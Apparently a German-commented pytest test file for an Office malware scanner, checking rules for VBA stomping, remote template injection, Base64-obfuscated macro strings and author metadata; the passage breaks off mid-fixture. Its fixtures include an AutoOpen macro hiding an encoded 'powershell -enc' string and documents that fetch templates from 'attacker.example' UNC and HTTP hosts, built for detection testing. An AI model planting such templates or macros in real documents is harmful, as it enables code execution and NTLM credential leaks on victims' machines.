"""Tests fuer die vier zusaetzlichen Office-Pruefungen (Runde: Office-Luecken).

Abgedeckt:
  * VBA-Stomping (``OFFICE_VBA_STOMPED``),
  * externe OOXML-Beziehungen / Remote Template Injection
    (``OFFICE_REMOTE_TEMPLATE``, ``OFFICE_EXTERNAL_REL``),
  * Dekodierung verschleierter Makro-Zeichenketten (``OFFICE_VBA_DECODED``),
  * Verfasser-Metadaten (``OFFICE_METADATA``).

Jede Regel hat eine Beissprobe: nimmt man den Fix zurueck (den Indikator bzw.
den Aufruf entfernen), wird der zugehoerige Test rot. Die Fixtures sind
selbst gebaut — ein minimales OOXML-ZIP mit und ohne externe Beziehung, eines
mit Metadaten, und fuer die VBA-Seite der CFB-Bauer des Projekts
(``scripts/ole_writer.make_vba_doc``), damit die echte olevba-API laeuft.
"""

from __future__ import annotations

import io
import os
import sys
import tempfile
import zipfile
from contextlib import contextmanager, suppress
from pathlib import Path
from typing import ClassVar

import pytest

from malaz.core.ooxml_rels import (
    MAX_RELATIONSHIPS,
    MAX_TARGET_CHARS,
    external_relationships,
)
from malaz.models import AnalysisContext
from malaz.pipelines.office_pipeline import OfficePipeline, _ooxml_bomb_guard

_SCRIPTS = Path(__file__).resolve().parent.parent / "scripts"


def _ctx(data: bytes, name: str = "test.docx", detected_type: str = "zip") -> AnalysisContext:
    return AnalysisContext(
        path=Path(name), data=data, detected_type=detected_type, size=len(data), depth=0
    )


@contextmanager
def _staged(data: bytes, suffix: str = ".docx"):
    """Temp-Datei mit genau diesen Bytes — was ``analyze()`` den Stages gibt."""
    fd, path = tempfile.mkstemp(suffix=suffix, prefix="malaz_test_")
    with os.fdopen(fd, "wb") as handle:
        handle.write(data)
    try:
        yield path
    finally:
        with suppress(OSError):
            os.unlink(path)


def _ids(indicators) -> set[str]:
    return {i.rule_id for i in indicators}


def _by_rule(indicators, rule):
    return next(i for i in indicators if i.rule_id == rule)


# -- Fixtures: OOXML --------------------------------------------------------- #

_REL_HEAD = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
)
_CONTENT_TYPES = (
    '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/'
    'package/2006/content-types"><Default Extension="xml" ContentType="application/xml"/></Types>'
)
# Das Dokument-Mitglied braucht die XML-Deklaration: ohne sie snifft die
# Inhaltserkennung "text" und die Format-Pruefung meldet fuer ein voellig
# harmloses .docx eine Format-Taeuschung (.xml vs. text).
_DOCUMENT_XML = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
    "<w:body><w:p><w:r><w:t>Vertragstext</w:t></w:r></w:p></w:body></w:document>"
)


def _zip(members: list[tuple[str, str | bytes]]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, data in members:
            zf.writestr(name, data)
    return buf.getvalue()


def _relationship(rel_id: str, kind: str, target: str, external: bool = True) -> str:
    mode = ' TargetMode="External"' if external else ""
    return (
        f'<Relationship Id="{rel_id}" '
        f'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/{kind}" '
        f'Target="{target}"{mode}/>'
    )


def _docx_with_external_template(target: str = "http://198.51.100.7/vorlage.dotm") -> bytes:
    """Minimales .docx mit externer ``attachedTemplate``-Beziehung."""
    return _zip(
        [
            ("[Content_Types].xml", _CONTENT_TYPES),
            ("_rels/.rels", "<Relationships/>"),
            ("word/document.xml", _DOCUMENT_XML),
            (
                "word/_rels/settings.xml.rels",
                _REL_HEAD + _relationship("rId1", "attachedTemplate", target) + "</Relationships>",
            ),
        ]
    )


def _docx_with_external_link() -> bytes:
    """Externe, aber ungefaehrlichere Beziehung (Excel ``externalLink``)."""
    return _zip(
        [
            ("[Content_Types].xml", _CONTENT_TYPES),
            (
                "xl/_rels/workbook.xml.rels",
                _REL_HEAD
                + _relationship("rId1", "externalLink", "http://198.51.100.9/daten.xlsx")
                + "</Relationships>",
            ),
        ]
    )


def _docx_without_external_rels() -> bytes:
    """Nur interne Beziehungen (Bild, Dokument) — nichts wird nachgeladen."""
    return _zip(
        [
            ("[Content_Types].xml", _CONTENT_TYPES),
            (
                "_rels/.rels",
                _REL_HEAD
                + _relationship("rId1", "officeDocument", "word/document.xml", external=False)
                + "</Relationships>",
            ),
            (
                "word/_rels/document.xml.rels",
                _REL_HEAD
                + _relationship("rId1", "image", "media/image1.png", external=False)
                + "</Relationships>",
            ),
        ]
    )


def _docx_with_metadata(
    author: str = "Max Privatnutzer",
    company: str = "Muster GmbH",
    last_by: str = "Hans Meier",
) -> bytes:
    """OOXML mit ``docProps/core.xml`` und ``docProps/app.xml``."""
    core = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/'
        'metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/">'
        f"<dc:creator>{author}</dc:creator>"
        f"<cp:lastModifiedBy>{last_by}</cp:lastModifiedBy>"
        "<dc:title>Rechnung &amp; Mahnung</dc:title>"
        "</cp:coreProperties>"
    )
    app = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/'
        'extended-properties">'
        "<Application>Microsoft Office Word</Application>"
        f"<Company>{company}</Company>"
        "<Template>Normal.dotm</Template>"
        "</Properties>"
    )
    return _zip(
        [
            ("[Content_Types].xml", _CONTENT_TYPES),
            ("docProps/core.xml", core),
            ("docProps/app.xml", app),
            ("word/document.xml", _DOCUMENT_XML),
        ]
    )


def _scan_bytes(data: bytes, suffix: str):
    """End-zu-End ueber den Dispatcher — das Urteil, das der Nutzer sieht."""
    from malaz.analysis.clamav import ClamAVScanner
    from malaz.analysis.windows_av import WindowsDefenderScanner
    from malaz.core.dispatcher import Dispatcher

    with _staged(data, suffix) as path:
        dispatcher = Dispatcher(
            av_scanner=WindowsDefenderScanner(enabled=False),
            clam_scanner=ClamAVScanner(enabled=False),
        )
        return dispatcher.scan_path(path)


# -- Fixtures: echtes VBA-Dokument ------------------------------------------- #

def _vba_doc(module_source: str) -> bytes:
    """Word-97-CFB mit einem echten MS-OVBA-Modul (der Fixture-Bauer des Projekts)."""
    sys.path.insert(0, str(_SCRIPTS))
    from ole_writer import make_vba_doc

    return make_vba_doc(module_source)


# olevba dekodiert Base64-Ketten im Quelltext; "powershell -enc …" steht danach
# lesbar da, obwohl der Quelltext nur den Base64-Block enthaelt.
_OBFUSCATED_MACRO = (
    "Sub AutoOpen()\r\n"
    "  Dim s As String\r\n"
    '  s = "cG93ZXJzaGVsbCAtZW5jIElFQmhjbQ=="\r\n'
    "End Sub\r\n"
)
_PLAIN_MACRO = (
    "Sub AutoOpen()\r\n"
    "  Dim s As String\r\n"
    '  s = "Guten Tag"\r\n'
    "End Sub\r\n"
)


def _run_real_vba(data: bytes):
    with _staged(data, ".doc") as tmp:
        return OfficePipeline()._vba_analysis(_ctx(data, "t.doc", "ole"), tmp)


# -- Fixtures: gefaelschter VBA_Parser --------------------------------------- #
#
# Die Stomping-/Dekodier-Pfade werden am Fake gemessen, genau wie die
# bestehenden VBA-Stufen-Tests (tests/test_office_stages.py): der positive Fall
# laesst sich offline nicht mit echten Bytes bauen (dafuer braeuchte es einen
# echten P-Code-Disassembler als Fixture-Bauer), der negative Fall und die
# Fehlerpfade dagegen schon.

_MACRO_YIELD = ("f", "s", "Module1", "Sub AutoOpen()\r\nEnd Sub\r\n")


class _FakeVbaParser:
    """Fake fuer oletools.olevba.VBA_Parser (nur die benutzten Methoden)."""

    has_macros: ClassVar[bool] = True
    macros: ClassVar[list] = [_MACRO_YIELD]
    stomping: ClassVar[bool] = False
    decoded: ClassVar[list] = []

    def __init__(self, path):
        pass

    def close(self) -> None:
        pass

    def detect_vba_macros(self) -> bool:
        return self.has_macros

    def find_vba_projects(self) -> int:
        return 1 if self.has_macros else 0

    def extract_macros(self):
        return iter(self.macros)

    def detect_vba_stomping(self) -> bool:
        return self.stomping

    def analyze_macros(self, show_decoded_strings: bool = False):
        return self.decoded


def _run_fake_vba(monkeypatch, parser_cls):
    import oletools.olevba as olevba

    monkeypatch.setattr(olevba, "VBA_Parser", parser_cls)
    data = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 508
    with _staged(data, ".doc") as tmp:
        return OfficePipeline()._vba_analysis(_ctx(data, "t.doc", "ole"), tmp), data


# ============================================================================ #
# 1) VBA-Stomping
# ============================================================================ #

def test_vba_stomping_is_a_high_finding(monkeypatch):
    """Der positive Fall: P-Code passt nicht zum Quelltext -> HIGH, Gewicht 30."""
    parser = type("P", (_FakeVbaParser,), {"stomping": True})
    inds, _ = _run_fake_vba(monkeypatch, parser)
    hit = _by_rule(inds, "OFFICE_VBA_STOMPED")
    assert hit.severity.name == "HIGH"
    assert hit.weight == 30
    assert "P-Code" in hit.title


def test_vba_stomping_absent_when_the_library_says_no(monkeypatch):
    """Gegenrichtung: kein Stomping -> kein Befund (kein Rauschen)."""
    inds, _ = _run_fake_vba(monkeypatch, _FakeVbaParser)
    assert "OFFICE_VBA_STOMPED" not in _ids(inds)
    assert "OFFICE_MACRO" in _ids(inds)


def test_vba_stomping_method_missing_is_documented_not_rebuilt(monkeypatch):
    """Fehlt die Bibliotheks-API, bleibt die Luecke offen statt selbst gebaut.

    ``detect_vba_stomping`` fehlt in aelteren oletools-Versionen. Ein eigener
    P-Code-Parser waere ein zweiter, ungepruefter Parser neben ``pcodedmp`` —
    die Stufe darf deshalb weder abstuerzen noch den Befund erfinden. Die
    uebrigen Makro-Meldungen bleiben stehen.
    """

    class P:
        """Parser ohne ``detect_vba_stomping`` und ohne ``analyze_macros``."""

        def __init__(self, path):
            pass

        def close(self):
            pass

        def detect_vba_macros(self):
            return True

        def find_vba_projects(self):
            return 1

        def extract_macros(self):
            return iter([_MACRO_YIELD])

    inds, _ = _run_fake_vba(monkeypatch, P)
    assert "OFFICE_VBA_STOMPED" not in _ids(inds)
    assert "OFFICE_VBA_DECODED" not in _ids(inds)
    assert "OFFICE_MACRO" in _ids(inds)


def test_vba_stomping_library_error_keeps_the_rest_of_the_stage(monkeypatch):
    """Ein Fehler aus pcodedmp darf die Makro-Stufe nicht sprengen."""
    def boom(self):
        raise RuntimeError("pcodedmp kaputt")

    parser = type("P", (_FakeVbaParser,), {"detect_vba_stomping": boom})
    inds, _ = _run_fake_vba(monkeypatch, parser)
    assert "OFFICE_VBA_STOMPED" not in _ids(inds)
    assert "OFFICE_MACRO" in _ids(inds)


def test_real_macro_document_is_not_flagged_as_stomped():
    """Falsch-Positiv-Schutz: ein normales Makro-Dokument ist nicht gestompt."""
    inds = _run_real_vba(_vba_doc(_PLAIN_MACRO))
    assert "OFFICE_MACRO" in _ids(inds)
    assert "OFFICE_VBA_STOMPED" not in _ids(inds)


# ============================================================================ #
# 2) Externe OOXML-Beziehungen (Remote Template Injection)
# ============================================================================ #

def test_external_relationships_finds_the_attached_template():
    rels = external_relationships(_docx_with_external_template())
    assert rels == [("attachedTemplate", "http://198.51.100.7/vorlage.dotm")]


def test_external_relationships_ignore_internal_and_untagged_targets():
    """Nur ``http(s)`` UND ``TargetMode="External"`` zaehlen."""
    internal = external_relationships(_docx_without_external_rels())
    assert internal == []

    # Externe Adresse, aber ohne ``TargetMode`` — keine Fernladung.
    untagged = _zip(
        [
            (
                "word/_rels/document.xml.rels",
                _REL_HEAD
                + _relationship("rId1", "image", "http://198.51.100.4/x.png", external=False)
                + "</Relationships>",
            )
        ]
    )
    assert external_relationships(untagged) == []


def test_external_relationships_of_a_non_zip_are_empty():
    assert external_relationships(b"kein zip, nur Bytes") == []


def _docx_with_settings_rels(body: str, prefix: str = "") -> bytes:
    """Gültiges .docx, dessen settings.rels genau ``body`` enthält.

    ``prefix`` erzeugt Namensraum-Präfixe (``<r:Relationship>``) — dieselbe
    Beziehung, andere Schreibweise.
    """
    if prefix:
        head = (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            f"<{prefix}Relationships "
            'xmlns="http://schemas.openxmlformats.org/package/2006/relationships" '
            'xmlns:r="http://schemas.openxmlformats.org/package/2006/relationships">'
        )
    else:
        head = (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            "<Relationships "
            'xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        )
    return _zip(
        [
            ("[Content_Types].xml", _CONTENT_TYPES),
            ("_rels/.rels", "<Relationships/>"),
            ("word/document.xml", _DOCUMENT_XML),
            ("word/_rels/settings.xml.rels", head + body + f"</{prefix}Relationships>"),
        ]
    )


def test_external_template_is_detected_in_every_valid_xml_spelling():
    """Regression BUG-026: gültiges XML entschied über das Urteil.

    Der handgeschriebene Scanner akzeptierte nur doppelte Anführungszeichen,
    keinen Namensraum-Präfix, keine Zeichenreferenzen und kein Tag über 4000
    Zeichen — dieselbe Angriffsdatei war mit ``"`` ROT 60 und mit ``'`` GRÜN 0.
    """
    target = "http://198.51.100.7/vorlage.dotm"
    typ = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
    variants = {
        "double": (
            (
                f'<Relationship Id="rId1" Type="{typ}" Target="{target}" '
                'TargetMode="External"/>'
            ),
            "",
        ),
        "single": (
            (
                f"<Relationship Id='rId1' Type='{typ}' Target='{target}' "
                "TargetMode='External'/>"
            ),
            "",
        ),
        "prefixed": (
            (
                f'<r:Relationship Id="rId1" Type="{typ}" Target="{target}" '
                'TargetMode="External"/>'
            ),
            "r:",
        ),
        "charref": (
            (
                f'<Relationship Id="rId1" Type="{typ}" '
                'Target="&#104;ttp://198.51.100.7/vorlage.dotm" '
                'TargetMode="&#69;xternal"/>'
            ),
            "",
        ),
        "long_tag": (
            (
                f'<Relationship Id="rId1" Padding="{"A" * 4100}" Type="{typ}" '
                f'Target="{target}" TargetMode="External"/>'
            ),
            "",
        ),
    }
    expected = [("attachedTemplate", target)]
    for name, (body, prefix) in variants.items():
        rels = external_relationships(_docx_with_settings_rels(body, prefix))
        assert rels == expected, f"{name}: {rels}"


def test_external_template_variant_reaches_the_indicator():
    """Dieselben Schreibweisen müssen den HIGH-Befund auslösen, nicht nur die Liste."""
    typ = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
    data = _docx_with_settings_rels(
        f"<Relationship Id='rId1' Type='{typ}' "
        "Target='http://198.51.100.7/vorlage.dotm' TargetMode='External'/>"
    )
    inds = OfficePipeline()._ooxml_rels_analysis(_ctx(data))
    hit = _by_rule(inds, "OFFICE_REMOTE_TEMPLATE")
    assert hit.weight == 30 and hit.severity.name == "HIGH"


def test_external_relationships_read_every_rels_member():
    """Nicht nur ``word/``: auch ``xl/``, ``ppt/`` und die Paketwurzel zaehlen."""
    for member in (
        "_rels/.rels",
        "word/_rels/document.xml.rels",
        "word/_rels/settings.xml.rels",
        "xl/_rels/workbook.xml.rels",
        "ppt/_rels/presentation.xml.rels",
    ):
        data = _zip(
            [
                (
                    member,
                    _REL_HEAD
                    + _relationship("rId1", "image", "http://198.51.100.5/b.png")
                    + "</Relationships>",
                )
            ]
        )
        assert external_relationships(data) == [("image", "http://198.51.100.5/b.png")], member


def test_external_relationships_are_capped_and_targets_shortened():
    """Die Grenzen halten einen praeparierten Container klein."""
    many = _REL_HEAD + "".join(
        _relationship(f"rId{i}", "externalLink", f"http://198.51.100.{i}/x")
        for i in range(60)
    ) + "</Relationships>"
    found = external_relationships(_zip([("xl/_rels/workbook.xml.rels", many)]))
    assert len(found) == MAX_RELATIONSHIPS

    long_target = "http://198.51.100.1/" + "a" * 900
    one = _zip(
        [
            (
                "xl/_rels/workbook.xml.rels",
                _REL_HEAD + _relationship("rId1", "externalLink", long_target) + "</Relationships>",
            )
        ]
    )
    (typ, ziel), = external_relationships(one)
    assert typ == "externalLink"
    assert len(ziel) == MAX_TARGET_CHARS


def test_remote_template_is_a_high_finding():
    inds = OfficePipeline()._ooxml_rels_analysis(_ctx(_docx_with_external_template()))
    hit = _by_rule(inds, "OFFICE_REMOTE_TEMPLATE")
    assert hit.severity.name == "HIGH"
    assert hit.weight == 30
    assert "Internet" in hit.title
    assert "198.51.100.7" in hit.detail
    # Die Vorlagen-Beziehung ist der scharfe Fall, kein zweiter Sammelbefund.
    assert "OFFICE_EXTERNAL_REL" not in _ids(inds)


def test_external_relation_without_template_is_low():
    """LOW/5, nicht MEDIUM/15 — gemessen an einer echten Datei.

    Eine .xlsx aus Good-Samples mit EINER externen Bild-URL kam auf 20 Punkte
    und GELB: diese Regel (15) plus GEN_IOC (5). Ein online eingebundenes Bild
    ist in Geschaeftsdokumenten aber normal; die Regel darf eine sonst saubere
    Datei nicht ueber die Schwelle (GREEN <= 19) heben. Die gefaehrliche
    Variante — eine nachgeladene Vorlage — hat mit OFFICE_REMOTE_TEMPLATE eine
    eigene, hoehere Regel.
    """
    inds = OfficePipeline()._ooxml_rels_analysis(_ctx(_docx_with_external_link()))
    hit = _by_rule(inds, "OFFICE_EXTERNAL_REL")
    assert hit.severity.name == "LOW"
    assert hit.weight == 5
    assert "198.51.100.9" in hit.detail
    assert "OFFICE_REMOTE_TEMPLATE" not in _ids(inds)


def test_document_without_external_relations_is_clean():
    assert OfficePipeline()._ooxml_rels_analysis(_ctx(_docx_without_external_rels())) == []


def test_remote_template_reaches_the_dispatcher_verdict():
    """End-zu-End: die Beziehung kommt im Urteil an (sonst wirkt sie harmlos)."""
    result = _scan_bytes(_docx_with_external_template(), ".docx")
    ids = {i.rule_id for i in result.all_indicators()}
    assert "OFFICE_REMOTE_TEMPLATE" in ids, sorted(ids)
    assert result.score >= 30, result.score


def test_clean_docx_stays_out_of_the_verdict():
    result = _scan_bytes(_docx_without_external_rels(), ".docx")
    ids = {i.rule_id for i in result.all_indicators()}
    assert "OFFICE_REMOTE_TEMPLATE" not in ids
    assert "OFFICE_EXTERNAL_REL" not in ids


# ============================================================================ #
# 3) Verschleierte Makro-Zeichenketten dekodieren
# ============================================================================ #

def test_hidden_base64_string_becomes_visible():
    """Positive Beissprobe: olevba dekodiert den Base64-Block, MEDIUM/15."""
    inds = _run_real_vba(_vba_doc(_OBFUSCATED_MACRO))
    hit = _by_rule(inds, "OFFICE_VBA_DECODED")
    assert hit.severity.name == "MEDIUM"
    assert hit.weight == 15
    # Der Nutzen steht im Detail: der lesbare Text, nicht der kodierte Block.
    assert "powershell" in hit.detail
    assert "cG93ZXJzaGVsbC" not in hit.detail


def test_plain_macro_has_nothing_to_decode():
    inds = _run_real_vba(_vba_doc(_PLAIN_MACRO))
    assert "OFFICE_VBA_DECODED" not in _ids(inds)


def test_already_visible_string_is_not_reported_as_decoded(monkeypatch):
    """Gegenrichtung: eine Dekodierung, die nur den Quelltext wiederholt, zaehlt nicht."""
    parser = type(
        "P",
        (_FakeVbaParser,),
        {
            "decoded": [("Base64 String", "powershell", "cG93ZXJzaGVsbA==")],
            "macros": [("f", "s", "Module1", 'Sub x()\r\n s = "powershell"\r\nEnd Sub\r\n')],
        },
    )
    inds, _ = _run_fake_vba(monkeypatch, parser)
    assert "OFFICE_VBA_DECODED" not in _ids(inds)


def test_decoded_strings_in_the_detail_are_capped(monkeypatch):
    """Ein riesiger dekodierter String darf die Meldung nicht fluten."""
    parser = type(
        "P",
        (_FakeVbaParser,),
        {"decoded": [("Hex String", "A" * 500, "41" * 500)]},
    )
    inds, _ = _run_fake_vba(monkeypatch, parser)
    hit = _by_rule(inds, "OFFICE_VBA_DECODED")
    assert "A" * 200 in hit.detail
    assert "A" * 201 not in hit.detail


def test_decoded_macro_reaches_the_dispatcher_verdict():
    result = _scan_bytes(_vba_doc(_OBFUSCATED_MACRO), ".doc")
    ids = {i.rule_id for i in result.all_indicators()}
    assert "OFFICE_VBA_DECODED" in ids, sorted(ids)


# ============================================================================ #
# 4) Verfasser-Metadaten (nur Information)
# ============================================================================ #

def test_ooxml_metadata_is_listed_as_information():
    inds = OfficePipeline()._metadata_analysis(_ctx(_docx_with_metadata()))
    hit = _by_rule(inds, "OFFICE_METADATA")
    assert hit.severity.name == "INFO"
    assert hit.weight == 0
    assert "Max Privatnutzer" in hit.detail
    assert "Hans Meier" in hit.detail
    assert "Muster GmbH" in hit.detail
    assert "Microsoft Office Word" in hit.detail
    assert "Normal.dotm" in hit.detail


def test_xml_entities_in_metadata_are_decoded():
    """``&amp;`` im Dokumentsatz darf nicht als Roh-Entitaet angezeigt werden."""
    data = _docx_with_metadata(author="Muster &amp; Partner")
    hit = _by_rule(OfficePipeline()._metadata_analysis(_ctx(data)), "OFFICE_METADATA")
    assert "Muster & Partner" in hit.detail
    assert "Muster &amp; Partner" not in hit.detail


def test_document_without_metadata_gets_no_indicator():
    assert OfficePipeline()._metadata_analysis(_ctx(_docx_without_external_rels())) == []


def test_ole_metadata_is_read_from_the_property_sets(monkeypatch):
    """Bei .doc/.xls kommen die Angaben aus den OLE-Property-Sets."""
    class _Meta:
        author = "Max Privatnutzer"
        last_saved_by = "Hans Meier"
        company = "Muster GmbH"
        creating_application = "Microsoft Word"
        template = "Normal.dotm"

    class _Ole:
        def __init__(self, *args, **kwargs):
            pass

        def __enter__(self):
            return self

        def __exit__(self, *exc):
            return False

        def get_metadata(self):
            return _Meta()

    monkeypatch.setattr("olefile.OleFileIO", _Ole)
    data = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 508
    hit = _by_rule(
        OfficePipeline()._metadata_analysis(_ctx(data, "t.doc", "ole")), "OFFICE_METADATA"
    )
    assert "Max Privatnutzer" in hit.detail
    assert "Muster GmbH" in hit.detail
    assert hit.weight == 0


def test_metadata_reaches_the_verdict_without_scoring():
    """End-zu-End: die Angaben erscheinen, bewegen den Score aber nicht."""
    result = _scan_bytes(_docx_with_metadata(), ".docx")
    hits = [i for i in result.all_indicators() if i.rule_id == "OFFICE_METADATA"]
    assert hits, sorted({i.rule_id for i in result.all_indicators()})
    assert hits[0].weight == 0
    assert hits[0].severity.name == "INFO"
    assert result.score == 0, result.score


# ============================================================================ #
# Titel-Pflicht (analog zu test_every_mail_rule_has_a_title)
# ============================================================================ #

def test_every_new_office_rule_carries_a_specific_title(monkeypatch):
    """Jede neue Regel braucht einen eigenen, sprechenden Titel.

    Analog zur Mail-Pruefung: dort fiel eine Regel still auf den Sammeltext
    "Auffälliger Mail-Header" zurueck. Die Office-Stufe hat keine Titel-Tabelle
    (jede Meldung wird mit Titel konstruiert), deshalb prueft dieser Test die
    ERZEUGTEN Indikatoren: jeder neue Befund traegt einen spezifischen deutschen
    Titel, und kein Titel wird fuer zwei Regeln wiederverwendet.
    """
    # Zuerst die echten Bytes messen: ``_run_fake_vba`` patcht den globalen
    # Parser und wuerde den echten Lauf sonst auf den Fake umlenken.
    decoded = _run_real_vba(_vba_doc(_OBFUSCATED_MACRO))
    stomped, _ = _run_fake_vba(monkeypatch, type("P", (_FakeVbaParser,), {"stomping": True}))
    rels = OfficePipeline()._ooxml_rels_analysis(_ctx(_docx_with_external_template()))
    link = OfficePipeline()._ooxml_rels_analysis(_ctx(_docx_with_external_link()))
    meta = OfficePipeline()._metadata_analysis(_ctx(_docx_with_metadata()))

    titles: dict[str, str] = {}
    for rule in (
        "OFFICE_VBA_STOMPED",
        "OFFICE_VBA_DECODED",
        "OFFICE_REMOTE_TEMPLATE",
        "OFFICE_EXTERNAL_REL",
        "OFFICE_METADATA",
    ):
        hit = _by_rule(stomped + decoded + rels + link + meta, rule)
        assert len(hit.title) >= 12, (rule, hit.title)
        titles[rule] = hit.title

    assert len(set(titles.values())) == len(titles), titles


def _valid_docx(extern: str | None, typ: str = "image") -> bytes:
    """Ein GUELTIGES minimales .docx — ohne externe Beziehung 0 Punkte.

    Wichtig: die erste Fassung dieses Fixtures war ungueltig (kein
    ``_rels/.rels``, kein Inhaltstyp) und erzeugte selbst 60 Punkte. Damit
    haette der Test die Kalibrierung der NEUEN Regel gemessen, indem er einen
    Strukturbefund des Fixtures mitzaehlte — der Test war gruen bzw. rot aus
    dem falschen Grund.
    """
    import io
    import zipfile

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr(
            "[Content_Types].xml",
            '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/'
            'package/2006/content-types"><Default Extension="xml" ContentType='
            '"application/xml"/></Types>',
        )
        z.writestr(
            "_rels/.rels",
            '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.'
            'org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.'
            'openxmlformats.org/officeDocument/2006/relationships/officeDocument" '
            'Target="word/document.xml"/></Relationships>',
        )
        z.writestr(
            "word/document.xml",
            '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/'
            'wordprocessingml/2006/main"><w:body/></w:document>',
        )
        if extern:
            z.writestr(
                "word/_rels/document.xml.rels",
                '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.'
                'org/package/2006/relationships"><Relationship Id="rId9" Type="http://'
                f'schemas.openxmlformats.org/officeDocument/2006/relationships/{typ}" '
                f'Target="{extern}" TargetMode="External"/></Relationships>',
            )
    return buf.getvalue()


def _scan(data: bytes, tmp_path, name: str):
    from malaz.analysis.clamav import ClamAVScanner
    from malaz.analysis.windows_av import WindowsDefenderScanner
    from malaz.core.dispatcher import Dispatcher

    pfad = tmp_path / name
    pfad.write_bytes(data)
    return Dispatcher(
        av_scanner=WindowsDefenderScanner(enabled=False),
        clamb_scanner=None,  # type: ignore[arg-type]
        clam_scanner=ClamAVScanner(enabled=False),
    ).scan_path(pfad)


def test_remote_image_does_not_tip_an_ordinary_document(tmp_path):
    """Ein online eingebundenes Bild ist in Geschaeftsdokumenten normal.

    Gemessen an einer echten .xlsx (Good-Samples): dieselbe Datei ohne externe
    Beziehung ergab 0 Punkte und GRUEN; mit EINER externen Bild-URL 20 und
    GELB — OFFICE_EXTERNAL_REL (15) plus GEN_IOC (5). Die neue Regel war der
    Ausloeser.

    Dieselbe Ueberkorrektur wie beim Zaehlpixel und bei MAIL_AUTH_ABSENT: ein
    Signal, das auf gewoehnlichen Dateien feuert, darf sie nicht ueber die
    Schwelle heben (GREEN <= 19). Das gefaehrliche Gegenstueck — eine
    nachgeladene VORLAGE — hat mit OFFICE_REMOTE_TEMPLATE eine eigene, hoeher
    gewichtete Regel.
    """
    from malaz.analysis.clamav import ClamAVScanner
    from malaz.analysis.windows_av import WindowsDefenderScanner
    from malaz.core.dispatcher import Dispatcher

    def scan(data: bytes, name: str):
        pfad = tmp_path / name
        pfad.write_bytes(data)
        return Dispatcher(
            av_scanner=WindowsDefenderScanner(enabled=False),
            clam_scanner=ClamAVScanner(enabled=False),
        ).scan_path(pfad)

    sauber = scan(_valid_docx(None), "sauber.docx")
    assert sauber.score == 0, (
        f"das Fixture ist nicht sauber ({sauber.score}): "
        f"{[(i.rule_id, i.weight) for i in sauber.all_indicators() if i.weight]}"
    )

    mit_bild = scan(_valid_docx("https://upload.wikimedia.org/logo.png"), "bild.docx")
    assert mit_bild.risk_level.short == "Unauffällig", (
        f"ein Dokument mit Online-Grafik wurde {mit_bild.risk_level.short} "
        f"({mit_bild.score}): "
        f"{[(i.rule_id, i.weight) for i in mit_bild.all_indicators() if i.weight]}"
    )
    # Der Befund bleibt trotzdem SICHTBAR — nur eben nicht ueber der Schwelle.
    ids = {i.rule_id for i in mit_bild.all_indicators()}
    assert "OFFICE_EXTERNAL_REL" in ids, "der Hinweis verschwand ganz"
    # Und eine nachgeladene VORLAGE bleibt gefaehrlich.
    # Die VORLAGE braucht den Typ attachedTemplate — mit dem image-Typ waere
    # es dieselbe Regel wie oben, und der Test pruefte nicht, was er behauptet.
    vorlage = scan(
        _valid_docx("https://boese.tld/vorlage.dotm", typ="attachedTemplate"),
        "vorlage.docx",
    )
    assert vorlage.risk_level.short != "Unauffällig", (
        f"die Vorlage wurde {vorlage.risk_level.short}: "
        f"{[(i.rule_id, i.weight) for i in vorlage.all_indicators() if i.weight]}"
    )
    assert "OFFICE_REMOTE_TEMPLATE" in {i.rule_id for i in vorlage.all_indicators()}


# ============================================================================ #
# 5) Audit-Funde Phase B: Beziehungen und Bombenschutz
# ============================================================================ #


@pytest.mark.parametrize(
    "target",
    [
        "\\\\attacker.example\\share\\vorlage.dotm",
        "file://attacker.example/vorlage.dotm",
        "//attacker.example/share/vorlage.dotm",
    ],
)
def test_remote_targets_beyond_http_are_external(target):
    """SEC-014: UNC und ``file://host`` laden sehr wohl von einem Fremdrechner.

    Die frühere Prüfung kannte nur ``https?://``; eine per SMB/WebDAV
    nachgeladene Vorlage (Remote Template Injection, NTLM-Leak) blieb stumm.
    """
    rels = external_relationships(_docx_with_external_template(target))
    assert rels == [("attachedTemplate", target)]
    inds = OfficePipeline()._ooxml_rels_analysis(
        _ctx(_docx_with_external_template(target))
    )
    assert "OFFICE_REMOTE_TEMPLATE" in _ids(inds)


def test_local_file_target_is_not_a_remote_relation():
    """Gegenprobe: ``file:///C:/…`` bleibt eine lokale Datei, kein Netzziel."""
    assert external_relationships(
        _docx_with_external_template("file:///C:/lokal/vorlage.dotm")
    ) == []


def test_relevant_rels_beat_the_member_cap_and_truncation_is_visible():
    """SEC-015: 200 Dummies durften die echte settings.rels nicht verstecken.

    Der Deckel bleibt (200), aber die dokumentweiten Beziehungsdateien werden
    ZUERST gelesen; dass gekürzt wurde, steht als Notiz im Bericht.
    """
    target = "http://198.51.100.7/vorlage.dotm"
    dummies = [
        (
            f"xl/worksheets/_rels/sheet{i}.xml.rels",
